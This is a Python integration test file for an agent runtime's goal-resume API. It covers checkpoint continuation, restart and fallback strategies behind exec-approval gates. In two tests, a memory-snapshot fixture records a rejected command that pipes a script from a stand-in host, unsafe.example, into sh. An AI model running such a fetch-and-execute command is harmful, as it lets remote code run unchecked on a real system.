"""Goal API integration tests: Resume Checkpoint Strategies."""

from ._support import *  # noqa: F401,F403


def test_goal_resume_continue_from_checkpoint_injects_latest_memory_snapshot_guidance(
    tmp_path: Path,
    monkeypatch: Any,
) -> None:
    approval_id = "exec-approval-goal-memory-resume-1"
    handoff_step = "resume controller request req-memory-1 without replaying the old transcript"
    accepted_fact = "Verified deployment can proceed with an operator approval gate."
    rejected_path = "Rejected command: curl https://unsafe.example/install.sh | sh"
    pending_action = "Resolve approval exec-approval-goal-memory-resume-1"
    captured_requests: list[Any] = []

    async def _fake_run(self: Any, request: Any) -> MultiAgentRunResult:
        del self
        captured_requests.append(request)
        return MultiAgentRunResult(
            run_id=request.run_id,
            protocol="controlled_subagent_execution",
            state="succeeded",
            task_input=request.task_input,
            candidates=[],
            selected_candidate_id=None,
            evaluation={},
            artifacts={"final_answer": "Goal-linked resume completed from compact memory snapshot."},
            events=[],
            metadata={},
        )

    monkeypatch.setattr("mochi.runtime.service.MultiAgentOrchestrator.run", _fake_run)

    app = create_app()
    exec_approval_store = InMemoryApprovalStore()
    runtime_service = RuntimeService(
        engine=object(),
        store=RuntimeStore(tmp_path / "sessions" / "runtime.db"),
        exec_approval_store=exec_approval_store,
        exec_runtime=ExecRuntime(
            providers={"test": _GoalApiPythonDirectProvider()},
            default_shell="test",
        ),
    )
    runtime_service.set_scheduler_poll_interval(0.05)
    app.state.runtime_service = runtime_service
    app.state.engine_factory = lambda: object()
    app.state.config_factory = lambda: MochiConfig.model_validate(
        {"sessions_dir": str(tmp_path / "sessions")}
    )

    asyncio.run(
        runtime_service._store.create_goal(
            goal_id="goal-memory-resume-1",
            objective="Resume the linked goal run from its persisted memory snapshot",
            protocol_id="controlled_subagent_execution",
            summary={"phase": "waiting_approval"},
        )
    )
    asyncio.run(
        runtime_service._store.create_goal_attempt(
            attempt_id="goal-memory-resume-attempt-1",
            goal_id="goal-memory-resume-1",
            attempt_index=1,
            status="waiting_approval",
            trigger="manual_start",
            agent_run_id="linked-memory-resume-run-1",
        )
    )
    asyncio.run(
        runtime_service._store.update_goal_status(
            "goal-memory-resume-1",
            "waiting_approval",
            current_attempt_id="goal-memory-resume-attempt-1",
        )
    )
    checkpoint = asyncio.run(
        runtime_service._store.create_goal_checkpoint(
            goal_id="goal-memory-resume-1",
            attempt_id="goal-memory-resume-attempt-1",
            agent_run_id="linked-memory-resume-run-1",
            checkpoint_index=5,
            stage="controller_decision",
            source="operator_test",
            payload={
                "checkpoint_index": 5,
                "stage": "controller_decision",
                "promotion": {
                    "mode": "internal_checkpoint_plus_downstream_artifacts",
                    "promoted_artifacts": [
                        {
                            "artifact_type": "claim_evidence_map",
                            "title": "Claim Evidence Map",
                            "uri": "agent-run://linked-memory-resume-run-1/artifacts/claim_evidence_map",
                            "mime_type": "application/json",
                        }
                    ],
                },
            },
            metadata={"signature": "resume-checkpoint-1"},
            captured_at="2026-06-23T03:10:00+00:00",
        )
    )
    asyncio.run(
        runtime_service._store.create_goal_memory_snapshot(
            goal_id="goal-memory-resume-1",
            attempt_id="goal-memory-resume-attempt-1",
            checkpoint_id=checkpoint["id"],
            snapshot_kind="compact_recovery_v1",
            snapshot={
                "goal_objective": "Resume the linked goal run from its persisted memory snapshot",
                "attempt_id": "goal-memory-resume-attempt-1",
                "agent_run_id": "linked-memory-resume-run-1",
                "protocol_id": "controlled_subagent_execution",
                "agent_run_status": "awaiting_approval",
                "stage": "controller_decision",
                "checkpoint_index": 5,
                "unfinished_steps": [handoff_step],
                "pending_actions": [pending_action],
                "accepted_facts": [accepted_fact],
                "rejected_paths": [rejected_path],
                "promoted_artifacts": [
                    {
                        "artifact_type": "claim_evidence_map",
                        "title": "Claim Evidence Map",
                        "uri": "agent-run://linked-memory-resume-run-1/artifacts/claim_evidence_map",
                        "mime_type": "application/json",
                    }
                ],
                "captured_at": "2026-06-23T03:10:01+00:00",
            },
            metadata={"signature": "resume-memory-1"},
            captured_at="2026-06-23T03:10:01+00:00",
        )
    )
    asyncio.run(
        runtime_service._store.create_agent_run(
            run_id="linked-memory-resume-run-1",
            protocol_id="controlled_subagent_execution",
            title="Goal memory resume linked run",
            topic="goal memory resume",
            summary={
                "goal_id": "goal-memory-resume-1",
                "goal_attempt_id": "goal-memory-resume-attempt-1",
                "objective": "Resume the linked goal run from its persisted memory snapshot",
                "task_input": "Resume the linked goal run from its persisted memory snapshot",
                "approval_state": {
                    "status": "awaiting_approval",
                    "pending_count": 1,
                    "approval_ids": [approval_id],
                    "pending_approvals": [
                        {
                            "approval_id": approval_id,
                            "tool_name": "exec_command",
                            "request_id": "req-memory-1",
                            "task_key": "controlled_execution_exec:req-memory-1",
                            "stage": "controlled_execution_exec:req-memory-1",
                            "role_id": "controller",
                            "source": "controlled_execution",
                        }
                    ],
                },
                "recovery_state": {
                    "status": "awaiting_approval",
                    "action": "await_approval",
                    "reason": "Execution approval required",
                    "stage": "controlled_execution_exec:req-memory-1",
                    "checkpoint": {
                        "checkpoint_index": 5,
                        "stage": "controller_decision",
                    },
                    "approval_state": {
                        "status": "awaiting_approval",
                        "pending_count": 1,
                        "approval_ids": [approval_id],
                        "pending_approvals": [
                            {
                                "approval_id": approval_id,
                                "tool_name": "exec_command",
                                "request_id": "req-memory-1",
                                "task_key": "controlled_execution_exec:req-memory-1",
                                "stage": "controlled_execution_exec:req-memory-1",
                                "role_id": "controller",
                                "source": "controlled_execution",
                            }
                        ],
                    },
                    "resume_payload": {
                        "version": 1,
                        "executor": "continue_from_checkpoint",
                        "strategy_default": "continue_from_checkpoint",
                        "stage": "controlled_execution_exec:req-memory-1",
                        "checkpoint": {
                            "checkpoint_index": 5,
                            "stage": "controller_decision",
                        },
                        "guidance_messages": [],
                        "role_guidance_messages": {},
                        "metadata_state": {},
                        "precomputed_artifacts": {},
                        "protocol_artifacts": {},
                        "candidates": [],
                        "evidence_packets": [],
                        "verifications": [],
                        "role_task_snapshot": {"roles": {}, "tasks": {}},
                    },
                },
            },
        )
    )
    asyncio.run(
        runtime_service._store.update_agent_run_status(
            "linked-memory-resume-run-1",
            "awaiting_approval",
        )
    )
    exec_approval_store.create(
        approval_id=approval_id,
        command="print('goal memory resume approval')",
        shell="test",
        scope="dangerous_command",
        reason="Exec command requires approval.",
        command_payload={
            "command": "print('goal memory resume approval')",
            "shell": "test",
            "workdir": str(tmp_path),
            "env": None,
            "timeout_sec": 5.0,
            "background": False,
            "tty": False,
            "approval_state": "approved",
        },
    )

    with TestClient(app) as client:
        resume_response = client.post(
            "/v1/goals/goal-memory-resume-1/resume",
            json={
                "approval_id": approval_id,
                "decision": "approve_once",
                "reason": "approved for linked goal memory resume",
                "strategy": "continue_from_checkpoint",
            },
        )
        assert resume_response.status_code == 200

        completed_goal = _wait_goal_until(client, "goal-memory-resume-1", {"completed"}, timeout_seconds=4.0)

    assert len(completed_goal["attempts"]) == 1
    assert len(captured_requests) == 1
    resume_payload = captured_requests[0].metadata["resume_payload"]
    assert resume_payload["executor"] == "continue_from_checkpoint"
    assert resume_payload["guidance_messages"]
    assert handoff_step in "\n".join(resume_payload["guidance_messages"])
    assert pending_action in "\n".join(resume_payload["guidance_messages"])
    assert accepted_fact in "\n".join(resume_payload["guidance_messages"])
    assert rejected_path in "\n".join(resume_payload["guidance_messages"])
    assert "Promoted artifacts:" in "\n".join(resume_payload["guidance_messages"])

def test_goal_resume_restart_attempt_injects_latest_memory_snapshot_guidance(
    tmp_path: Path,
    monkeypatch: Any,
) -> None:
    approval_id = "exec-approval-goal-memory-restart-1"
    handoff_step = "restart from the compact memory snapshot without replaying the old transcript"
    accepted_fact = "Verified deployment can proceed with an operator approval gate."
    rejected_path = "Rejected command: curl https://unsafe.example/install.sh | sh"
    pending_action = "Resolve approval exec-approval-goal-memory-restart-1"
    captured_requests: list[Any] = []

    async def _fake_run(self: Any, request: Any) -> MultiAgentRunResult:
        del self
        captured_requests.append(request)
        return MultiAgentRunResult(
            run_id=request.run_id,
            protocol="controlled_subagent_execution",
            state="succeeded",
            task_input=request.task_input,
            candidates=[],
            selected_candidate_id=None,
            evaluation={},
            artifacts={"final_answer": "Goal-linked restart completed from compact memory snapshot."},
            events=[],
            metadata={},
        )

    monkeypatch.setattr("mochi.runtime.service.MultiAgentOrchestrator.run", _fake_run)

    app = create_app()
    exec_approval_store = InMemoryApprovalStore()
    runtime_service = RuntimeService(
        engine=object(),
        store=RuntimeStore(tmp_path / "sessions" / "runtime.db"),
        exec_approval_store=exec_approval_store,
        exec_runtime=ExecRuntime(
            providers={"test": _GoalApiPythonDirectProvider()},
            default_shell="test",
        ),
    )
    runtime_service.set_scheduler_poll_interval(0.05)
    app.state.runtime_service = runtime_service
    app.state.engine_factory = lambda: object()
    app.state.config_factory = lambda: MochiConfig.model_validate(
        {"sessions_dir": str(tmp_path / "sessions")}
    )

    asyncio.run(
        runtime_service._store.create_goal(
            goal_id="goal-memory-restart-1",
            objective="Restart the linked goal run from its persisted compact memory snapshot",
            protocol_id="controlled_subagent_execution",
            summary={"phase": "waiting_approval"},
        )
    )
    asyncio.run(
        runtime_service._store.create_goal_attempt(
            attempt_id="goal-memory-restart-attempt-1",
            goal_id="goal-memory-restart-1",
            attempt_index=1,
            status="waiting_approval",
            trigger="manual_start",
            agent_run_id="linked-memory-restart-run-1",
        )
    )
    asyncio.run(
        runtime_service._store.update_goal_status(
            "goal-memory-restart-1",
            "waiting_approval",
            current_attempt_id="goal-memory-restart-attempt-1",
        )
    )
    checkpoint = asyncio.run(
        runtime_service._store.create_goal_checkpoint(
            goal_id="goal-memory-restart-1",
            attempt_id="goal-memory-restart-attempt-1",
            agent_run_id="linked-memory-restart-run-1",
            checkpoint_index=5,
            stage="controller_decision",
            source="operator_test",
            payload={
                "checkpoint_index": 5,
                "stage": "controller_decision",
                "promotion": {
                    "mode": "internal_checkpoint_plus_downstream_artifacts",
                    "promoted_artifacts": [
                        {
                            "artifact_type": "verification_summary",
                            "title": "Verification Summary",
                            "uri": "agent-run://linked-memory-restart-run-1/artifacts/verification_summary",
                            "mime_type": "application/json",
                        }
                    ],
                },
            },
            metadata={"signature": "restart-checkpoint-1"},
            captured_at="2026-06-23T03:20:00+00:00",
        )
    )
    asyncio.run(
        runtime_service._store.create_goal_memory_snapshot(
            goal_id="goal-memory-restart-1",
            attempt_id="goal-memory-restart-attempt-1",
            checkpoint_id=checkpoint["id"],
            snapshot_kind="compact_recovery_v1",
            snapshot={
                "goal_objective": "Restart the linked goal run from its persisted compact memory snapshot",
                "attempt_id": "goal-memory-restart-attempt-1",
                "agent_run_id": "linked-memory-restart-run-1",
                "protocol_id": "controlled_subagent_execution",
                "agent_run_status": "awaiting_approval",
                "stage": "controller_decision",
                "checkpoint_index": 5,
                "unfinished_steps": [handoff_step],
                "pending_actions": [pending_action],
                "accepted_facts": [accepted_fact],
                "rejected_paths": [rejected_path],
                "promoted_artifacts": [
                    {
                        "artifact_type": "verification_summary",
                        "title": "Verification Summary",
                        "uri": "agent-run://linked-memory-restart-run-1/artifacts/verification_summary",
                        "mime_type": "application/json",
                    }
                ],
                "captured_at": "2026-06-23T03:20:01+00:00",
            },
            metadata={"signature": "restart-memory-1"},
            captured_at="2026-06-23T03:20:01+00:00",
        )
    )
    asyncio.run(
        runtime_service._store.create_agent_run(
            run_id="linked-memory-restart-run-1",
            protocol_id="controlled_subagent_execution",
            title="Goal memory restart linked run",
            topic="goal memory restart",
            summary={
                "goal_id": "goal-memory-restart-1",
                "goal_attempt_id": "goal-memory-restart-attempt-1",
                "objective": "Restart the linked goal run from its persisted compact memory snapshot",
                "task_input": "Restart the linked goal run from its persisted compact memory snapshot",
                "approval_state": {
                    "status": "awaiting_approval",
                    "pending_count": 1,
                    "approval_ids": [approval_id],
                    "pending_approvals": [
                        {
                            "approval_id": approval_id,
                            "tool_name": "exec_command",
                            "request_id": "req-memory-restart-1",
                            "task_key": "controlled_execution_exec:req-memory-restart-1",
                            "stage": "controlled_execution_exec:req-memory-restart-1",
                            "role_id": "controller",
                            "source": "controlled_execution",
                        }
                    ],
                },
                "recovery_state": {
                    "status": "awaiting_approval",
                    "action": "await_approval",
                    "reason": "Execution approval required",
                    "stage": "controlled_execution_exec:req-memory-restart-1",
                    "checkpoint": {
                        "checkpoint_index": 5,
                        "stage": "controller_decision",
                    },
                    "approval_state": {
                        "status": "awaiting_approval",
                        "pending_count": 1,
                        "approval_ids": [approval_id],
                        "pending_approvals": [
                            {
                                "approval_id": approval_id,
                                "tool_name": "exec_command",
                                "request_id": "req-memory-restart-1",
                                "task_key": "controlled_execution_exec:req-memory-restart-1",
                                "stage": "controlled_execution_exec:req-memory-restart-1",
                                "role_id": "controller",
                                "source": "controlled_execution",
                            }
                        ],
                    },
                    "resume_payload": {
                        "version": 1,
                        "executor": "continue_from_checkpoint",
                        "strategy_default": "continue_from_checkpoint",
                        "stage": "controlled_execution_exec:req-memory-restart-1",
                        "checkpoint": {
                            "checkpoint_index": 5,
                            "stage": "controller_decision",
                        },
                        "guidance_messages": [],
                        "role_guidance_messages": {},
                        "metadata_state": {},
                        "precomputed_artifacts": {},
                        "protocol_artifacts": {},
                        "candidates": [],
                        "evidence_packets": [],
                        "verifications": [],
                        "role_task_snapshot": {"roles": {}, "tasks": {}},
                    },
                },
            },
        )
    )
    asyncio.run(
        runtime_service._store.update_agent_run_status(
            "linked-memory-restart-run-1",
            "awaiting_approval",
        )
    )
    exec_approval_store.create(
        approval_id=approval_id,
        command="print('goal memory restart approval')",
        shell="test",
        scope="dangerous_command",
        reason="Exec command requires approval.",
        command_payload={
            "command": "print('goal memory restart approval')",
            "shell": "test",
            "workdir": str(tmp_path),
            "env": None,
            "timeout_sec": 5.0,
            "background": False,
            "tty": False,
            "approval_state": "approved",
        },
    )

    with TestClient(app) as client:
        resume_response = client.post(
            "/v1/goals/goal-memory-restart-1/resume",
            json={
                "approval_id": approval_id,
                "decision": "approve_once",
                "reason": "approved for linked goal memory restart",
                "strategy": "restart_attempt",
            },
        )
        assert resume_response.status_code == 200

        completed_goal = _wait_goal_until(client, "goal-memory-restart-1", {"completed"}, timeout_seconds=4.0)
        linked_run_response = client.get("/v1/agent-runs/linked-memory-restart-run-1")
        assert linked_run_response.status_code == 200
        linked_run = linked_run_response.json()

    assert len(completed_goal["attempts"]) == 1
    assert len(captured_requests) == 1
    assert captured_requests[0].metadata["resume_strategy"] == "restart_attempt"
    assert captured_requests[0].metadata["resume_payload"] == {}
    assert captured_requests[0].guidance_messages
    joined_guidance = "\n".join(captured_requests[0].guidance_messages)
    assert handoff_step in joined_guidance
    assert pending_action in joined_guidance
    assert accepted_fact in joined_guidance
    assert rejected_path in joined_guidance
    assert "Promoted artifacts:" in joined_guidance
    assert linked_run["summary"]["goal_handoff"]["durable_handoff_gate"]["usable"] is True
    assert linked_run["summary"]["goal_handoff"]["checkpoint_promotion_mode"] == (
        "internal_checkpoint_plus_downstream_artifacts"
    )
    assert linked_run["summary"]["goal_handoff"]["promoted_artifacts"][0]["artifact_type"] == (
        "verification_summary"
    )

def test_goal_resume_continue_from_checkpoint_falls_back_to_restart_without_durable_handoff(
    tmp_path: Path,
    monkeypatch: Any,
) -> None:
    approval_id = "exec-approval-goal-memory-fallback-1"
    captured_requests: list[Any] = []

    async def _fake_run(self: Any, request: Any) -> MultiAgentRunResult:
        del self
        captured_requests.append(request)
        return MultiAgentRunResult(
            run_id=request.run_id,
            protocol="controlled_subagent_execution",
            state="succeeded",
            task_input=request.task_input,
            candidates=[],
            selected_candidate_id=None,
            evaluation={},
            artifacts={"final_answer": "Goal-linked resume restarted without durable handoff."},
            events=[],
            metadata={},
        )

    monkeypatch.setattr("mochi.runtime.service.MultiAgentOrchestrator.run", _fake_run)

    app = create_app()
    exec_approval_store = InMemoryApprovalStore()
    runtime_service = RuntimeService(
        engine=object(),
        store=RuntimeStore(tmp_path / "sessions" / "runtime.db"),
        exec_approval_store=exec_approval_store,
        exec_runtime=ExecRuntime(
            providers={"test": _GoalApiPythonDirectProvider()},
            default_shell="test",
        ),
    )
    runtime_service.set_scheduler_poll_interval(0.05)
    app.state.runtime_service = runtime_service
    app.state.engine_factory = lambda: object()
    app.state.config_factory = lambda: MochiConfig.model_validate(
        {"sessions_dir": str(tmp_path / "sessions")}
    )

    asyncio.run(
        runtime_service._store.create_goal(
            goal_id="goal-memory-fallback-1",
            objective="Resume the linked goal run only when durable handoff exists",
            protocol_id="controlled_subagent_execution",
            summary={"phase": "waiting_approval"},
        )
    )
    asyncio.run(
        runtime_service._store.create_goal_attempt(
            attempt_id="goal-memory-fallback-attempt-1",
            goal_id="goal-memory-fallback-1",
            attempt_index=1,
            status="waiting_approval",
            trigger="manual_start",
            agent_run_id="linked-memory-fallback-run-1",
        )
    )
    asyncio.run(
        runtime_service._store.update_goal_status(
            "goal-memory-fallback-1",
            "waiting_approval",
            current_attempt_id="goal-memory-fallback-attempt-1",
        )
    )
    asyncio.run(
        runtime_service._store.create_agent_run(
            run_id="linked-memory-fallback-run-1",
            protocol_id="controlled_subagent_execution",
            title="Goal memory fallback linked run",
            topic="goal memory fallback",
            summary={
                "goal_id": "goal-memory-fallback-1",
                "goal_attempt_id": "goal-memory-fallback-attempt-1",
                "objective": "Resume the linked goal run only when durable handoff exists",
                "task_input": "Resume the linked goal run only when durable handoff exists",
                "approval_state": {
                    "status": "awaiting_approval",
                    "pending_count": 1,
                    "approval_ids": [approval_id],
                    "pending_approvals": [
                        {
                            "approval_id": approval_id,
                            "tool_name": "exec_command",
                            "request_id": "req-fallback-1",
                            "task_key": "controlled_execution_exec:req-fallback-1",
                            "stage": "controlled_execution_exec:req-fallback-1",
                            "role_id": "controller",
                            "source": "controlled_execution",
                        }
                    ],
                },
                "recovery_state": {
                    "status": "awaiting_approval",
                    "action": "await_approval",
                    "reason": "Execution approval required",
                    "stage": "controlled_execution_exec:req-fallback-1",
                    "checkpoint": {
                        "checkpoint_index": 5,
                        "stage": "controller_decision",
                        "captured_at": "2026-06-23T03:10:01+00:00",
                    },
                    "approval_state": {
                        "status": "awaiting_approval",
                        "pending_count": 1,
                        "approval_ids": [approval_id],
                        "pending_approvals": [
                            {
                                "approval_id": approval_id,
                                "tool_name": "exec_command",
                                "request_id": "req-fallback-1",
                                "task_key": "controlled_execution_exec:req-fallback-1",
                                "stage": "controlled_execution_exec:req-fallback-1",
                                "role_id": "controller",
                                "source": "controlled_execution",
                            }
                        ],
                    },
                    "resume_payload": {
                        "version": 1,
                        "executor": "continue_from_checkpoint",
                        "strategy_default": "continue_from_checkpoint",
                        "stage": "controlled_execution_exec:req-fallback-1",
                        "checkpoint": {
                            "checkpoint_index": 5,
                            "stage": "controller_decision",
                            "captured_at": "2026-06-23T03:10:01+00:00",
                        },
                        "guidance_messages": [],
                        "role_guidance_messages": {},
                        "metadata_state": {},
                        "precomputed_artifacts": {},
                        "protocol_artifacts": {},
                        "candidates": [],
                        "evidence_packets": [],
                        "verifications": [],
                        "role_task_snapshot": {"roles": {}, "tasks": {}},
                    },
                },
            },
        )
    )
    asyncio.run(
        runtime_service._store.update_agent_run_status(
            "linked-memory-fallback-run-1",
            "awaiting_approval",
        )
    )
    exec_approval_store.create(
        approval_id=approval_id,
        command="print('goal memory fallback approval')",
        shell="test",
        scope="dangerous_command",
        reason="Exec command requires approval.",
        command_payload={
            "command": "print('goal memory fallback approval')",
            "shell": "test",
            "workdir": str(tmp_path),
            "env": None,
            "timeout_sec": 5.0,
            "background": False,
            "tty": False,
            "approval_state": "approved",
        },
    )

    with TestClient(app) as client:
        resume_response = client.post(
            "/v1/goals/goal-memory-fallback-1/resume",
            json={
                "approval_id": approval_id,
                "decision": "approve_once",
                "reason": "approved for linked goal memory fallback resume",
                "strategy": "continue_from_checkpoint",
            },
        )
        assert resume_response.status_code == 200

        completed_goal = _wait_goal_until(
            client,
            "goal-memory-fallback-1",
            {"completed"},
            timeout_seconds=4.0,
        )
        linked_run_response = client.get("/v1/agent-runs/linked-memory-fallback-run-1")
        assert linked_run_response.status_code == 200
        linked_run = linked_run_response.json()

    assert len(completed_goal["attempts"]) == 1
    assert len(captured_requests) == 1
    assert captured_requests[0].metadata["resume_strategy"] == "restart_attempt"
    assert captured_requests[0].metadata["resume_payload"] == {}
    assert captured_requests[0].metadata["resume_runtime"]["strategy"] == "restart_attempt"
    assert linked_run["summary"]["goal_handoff"]["resume_gate"]["effective_strategy"] == "restart_attempt"
    assert linked_run["summary"]["goal_handoff"]["resume_gate"]["reason"] == "missing_memory_snapshot"
    resumed_events = [
        event
        for event in linked_run["events"]
        if isinstance(event, dict) and event.get("type") == "run_resumed"
    ]
    assert resumed_events
    assert resumed_events[-1]["resume_strategy"] == "restart_attempt"

def test_goal_resume_continue_from_checkpoint_rehydrates_from_durable_goal_checkpoint(
    tmp_path: Path,
    monkeypatch: Any,
) -> None:
    captured_requests: list[Any] = []

    async def _fake_run(self: Any, request: Any) -> MultiAgentRunResult:
        del self
        captured_requests.append(request)
        return MultiAgentRunResult(
            run_id=request.run_id,
            protocol="teacher_student_distill",
            state="succeeded",
            task_input=request.task_input,
            candidates=[],
            selected_candidate_id=None,
            evaluation={},
            artifacts={"final_answer": "Goal-linked checkpoint resume rehydrated from durable state."},
            events=[],
            metadata={},
        )

    monkeypatch.setattr("mochi.runtime.service.MultiAgentOrchestrator.run", _fake_run)

    app = create_app()
    runtime_service = RuntimeService(
        engine=object(),
        store=RuntimeStore(tmp_path / "sessions" / "runtime.db"),
    )
    runtime_service.set_scheduler_poll_interval(0.05)
    app.state.runtime_service = runtime_service
    app.state.engine_factory = lambda: object()
    app.state.config_factory = lambda: MochiConfig.model_validate(
        {"sessions_dir": str(tmp_path / "sessions")}
    )

    goal_id = "goal-rehydrate-resume-1"
    attempt_id = "goal-rehydrate-resume-attempt-1"
    run_id = "linked-rehydrate-resume-run-1"
    checkpoint_captured_at = "2026-06-23T04:00:00+00:00"
    snapshot_captured_at = "2026-06-23T04:00:01+00:00"
    role_task_snapshot = {
        "version": 1,
        "roles": {
            "teacher": {
                "role_id": "teacher",
                "status": "completed",
                "stage": "teacher_generation",
                "resume_action": "reuse_output",
                "candidate": {
                    "candidate_id": "teacher-candidate-1",
                    "role_id": "teacher",
                    "content": "Teacher draft",
                    "metadata": {"model_id": "teacher-model"},
                },
            }
        },
        "tasks": {
            "teacher_generation": {
                "task_key": "teacher_generation",
                "role_id": "teacher",
                "status": "completed",
                "stage": "teacher_generation",
                "resume_action": "reuse_output",
                "candidate": {
                    "candidate_id": "teacher-candidate-1",
                    "role_id": "teacher",
                    "content": "Teacher draft",
                    "metadata": {"model_id": "teacher-model"},
                },
            }
        },
    }

    asyncio.run(
        runtime_service._store.create_goal(
            goal_id=goal_id,
            objective="Resume a stalled linked run from its durable goal checkpoint.",
            protocol_id="teacher_student_distill",
            summary={"phase": "stalled"},
        )
    )
    asyncio.run(
        runtime_service._store.create_goal_attempt(
            attempt_id=attempt_id,
            goal_id=goal_id,
            attempt_index=1,
            status="stalled",
            trigger="manual_start",
            agent_run_id=run_id,
        )
    )
    asyncio.run(
        runtime_service._store.update_goal_status(
            goal_id,
            "stalled",
            current_attempt_id=attempt_id,
        )
    )
    checkpoint = asyncio.run(
        runtime_service._store.create_goal_checkpoint(
            goal_id=goal_id,
            attempt_id=attempt_id,
            agent_run_id=run_id,
            checkpoint_index=4,
            stage="teacher_generation",
            source="operator_test",
            payload={
                "checkpoint_index": 4,
                "stage": "teacher_generation",
                "checkpoint": {
                    "checkpoint_index": 4,
                    "stage": "teacher_generation",
                    "captured_at": checkpoint_captured_at,
                },
                "recovery_state": {
                    "status": "stalled",
                    "action": "resume",
                    "reason": "Teacher worker disconnected before downstream stages finished.",
                    "stage": "teacher_generation",
                    "checkpoint": {
                        "checkpoint_index": 4,
                        "stage": "teacher_generation",
                        "captured_at": checkpoint_captured_at,
                    },
                    "unfinished_steps": [
                        "Continue from the teacher checkpoint without replaying the full run."
                    ],
                    "role_task_snapshot": role_task_snapshot,
                },
            },
            metadata={"signature": "rehydrate-resume-checkpoint-1"},
            captured_at=checkpoint_captured_at,
        )
    )
    asyncio.run(
        runtime_service._store.create_goal_memory_snapshot(
            goal_id=goal_id,
            attempt_id=attempt_id,
            checkpoint_id=checkpoint["id"],
            snapshot_kind="compact_recovery_v1",
            snapshot={
                "goal_objective": "Resume a stalled linked run from its durable goal checkpoint.",
                "attempt_id": attempt_id,
                "agent_run_id": run_id,
                "protocol_id": "teacher_student_distill",
                "agent_run_status": "stalled",
                "stage": "teacher_generation",
                "checkpoint_index": 4,
                "unfinished_steps": [
                    "Continue from the teacher checkpoint without replaying the full run."
                ],
                "captured_at": snapshot_captured_at,
            },
            metadata={"signature": "rehydrate-resume-memory-1"},
            captured_at=snapshot_captured_at,
        )
    )
    asyncio.run(
        runtime_service._store.create_agent_run(
            run_id=run_id,
            protocol_id="teacher_student_distill",
            title="Goal checkpoint rehydrate linked run",
            topic="goal checkpoint rehydrate",
            summary={
                "goal_id": goal_id,
                "goal_attempt_id": attempt_id,
                "objective": "Resume a stalled linked run from its durable goal checkpoint.",
                "task_input": "Resume a stalled linked run from its durable goal checkpoint.",
                "recovery_state": {
                    "status": "stalled",
                    "action": "resume",
                    "reason": "Teacher worker disconnected before downstream stages finished.",
                    "stage": "teacher_generation",
                    "checkpoint": {
                        "checkpoint_index": 4,
                        "stage": "teacher_generation",
                        "captured_at": checkpoint_captured_at,
                    },
                },
            },
        )
    )
    asyncio.run(runtime_service._store.update_agent_run_status(run_id, "stalled"))

    with TestClient(app) as client:
        resume_response = client.post(
            f"/v1/goals/{goal_id}/resume",
            json={"strategy": "continue_from_checkpoint"},
        )
        assert resume_response.status_code == 200

        completed_goal = _wait_goal_until(client, goal_id, {"completed"}, timeout_seconds=4.0)
        linked_run_response = client.get(f"/v1/agent-runs/{run_id}")
        assert linked_run_response.status_code == 200
        linked_run = linked_run_response.json()

    assert len(completed_goal["attempts"]) == 1
    assert len(captured_requests) == 1
    assert captured_requests[0].metadata["resume_strategy"] == "continue_from_checkpoint"
    resume_payload = captured_requests[0].metadata["resume_payload"]
    assert resume_payload["executor"] == "continue_from_checkpoint"
    assert resume_payload["role_task_snapshot"]["roles"]["teacher"]["status"] == "completed"
    assert linked_run["summary"]["goal_handoff"]["resume_gate"]["effective_strategy"] == (
        "continue_from_checkpoint"
    )
    assert linked_run["summary"]["goal_handoff"]["resume_payload_rehydrated_from"] == (
        "durable_goal_checkpoint"
    )
